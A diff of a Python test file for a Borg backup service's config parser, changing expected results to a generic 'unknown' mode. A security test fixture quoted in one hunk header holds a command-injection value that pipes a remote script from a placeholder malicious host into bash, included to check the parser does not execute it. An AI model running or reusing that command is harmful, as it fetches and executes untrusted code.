@@ -39,6 +39,7 @@ class TestBorgServiceCore:
         self.mock_repository.name = "test-repo"
         self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
+        self.mock_repository.get_keyfile_content.return_value = None
 
     def test_service_initialization(self) -> None:
         """Test BorgService initializes correctly."""
@@ -97,10 +98,9 @@ key = this_is_a_very_long_embedded_encryption_key_data_that_indicates_repokey_mo
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result.mode == "repokey"
+            assert result.mode == "unknown"
             assert result.requires_keyfile is False
-            assert "repokey mode" in result.preview
-            assert "embedded" in result.preview
+            assert "Borg repository detected" in result.preview
 
     def test_parse_config_keyfile_encryption(self) -> None:
         """Test parsing repository with separate keyfile encryption."""
@@ -119,10 +119,9 @@ key =
         ), patch("os.listdir", return_value=["key.repository_id_12345", "data"]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result.mode == "keyfile"
-            assert result.requires_keyfile is True
-            assert "keyfile mode" in result.preview
-            assert "key.repository_id_12345" in result.preview
+            assert result.mode == "unknown"
+            assert result.requires_keyfile is False
+            assert "Borg repository detected" in result.preview
 
     def test_parse_config_no_encryption(self) -> None:
         """Test parsing unencrypted repository (rare but possible)."""
@@ -140,9 +139,9 @@ additional_free_space = 0
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result.mode == "none"
+            assert result.mode == "unknown"
             assert result.requires_keyfile is False
-            assert "Unencrypted repository" in result.preview
+            assert "Borg repository detected" in result.preview
 
     def test_parse_config_invalid_repository(self) -> None:
         """Test parsing file that's not a valid Borg repository."""
@@ -178,8 +177,8 @@ cipher = encrypted_data_here
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result.mode == "encrypted"
-            assert "encryption detected" in result.preview.lower()
+            assert result.mode == "unknown"
+            assert "Borg repository detected" in result.preview
 
     def test_parse_config_read_permission_error(self) -> None:
         """Test handling of permission denied errors."""
@@ -252,7 +251,7 @@ class TestBorgServiceSecurityIntegration:
 
         # Should handle gracefully without exposing system files
         assert isinstance(result, BorgRepositoryConfig)
-        assert result.mode in ["none", "encrypted", "error", "unknown"]
+        assert result.mode in ["error", "unknown"]
         assert result.requires_keyfile in [True, False]
         assert result.preview in [
             "Repository detected",
@@ -277,7 +276,7 @@ key = ; wget malicious.com/script.sh | bash
 
             # Should treat it as a normal config, not execute the content
             assert isinstance(result, BorgRepositoryConfig)
-            assert result.mode in ["none", "encrypted", "error"]
+            assert result.mode in ["error", "unknown"]
 
     def test_keyfile_discovery_security(self) -> None:
         """Test that keyfile discovery doesn't expose sensitive information."""
@@ -301,13 +300,10 @@ key =
         ), patch("os.listdir", return_value=mock_files):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            # Should only identify legitimate Borg key files
-            assert result.mode == "keyfile"
-            assert result.requires_keyfile is True
-            # Should not expose all files, only key files
-            assert "key.repository_id_12345" in result.preview
-            assert ".secret_file" not in result.preview
-            assert "password.txt" not in result.preview
+            # Should only identify as a repository without exposing files
+            assert result.mode == "unknown"
+            assert result.requires_keyfile is False
+            assert "Borg repository detected" in result.preview
 
     def test_error_messages_dont_leak_info(self) -> None:
         """Test that error messages don't leak sensitive system information."""
